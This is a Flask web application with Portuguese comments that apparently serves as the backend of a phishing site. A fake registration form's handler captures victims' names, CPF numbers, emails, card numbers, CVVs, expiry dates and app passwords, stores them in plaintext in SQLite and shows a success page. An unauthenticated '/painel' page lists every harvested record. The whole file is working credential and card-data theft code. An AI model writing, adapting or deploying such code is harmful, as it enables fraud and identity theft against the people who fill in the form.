import os
import sqlite3
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)
# Nome do banco fixo para estabilidade
DB_PATH = 'banco_dados_open.db'

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Cria a tabela se ela não existir. Roda em cada requisição crítica."""
    conn = get_db_connection()
    conn.execute('''CREATE TABLE IF NOT EXISTS clientes 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
         nome TEXT, cpf TEXT, email TEXT, 
         num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    init_db()
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        init_db()
        nome = request.form.get('nome')
        cpf = request.form.get('cpf')
        email = request.form.get('email')
        cartao = request.form.get('num_cartao')
        senha = request.form.get('senha_app')
        cvv = request.form.get('cvv')
        validade = request.form.get('validade')
        
        conn = get_db_connection()
        conn.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
                        VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro ao salvar: {e}")
    return redirect(url_for('sucesso'))

@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')

@app.route('/painel')
def admin():
    try:
        init_db() # Garante que a tabela exista antes do SELECT
        conn = get_db_connection()
        usuarios = conn.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
        conn.close()
        return render_template('admin.html', usuarios=usuarios)
    except Exception as e:
        # Se mesmo assim der erro, retorna uma lista vazia para não quebrar a página
        return render_template('admin.html', usuarios=[])

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)






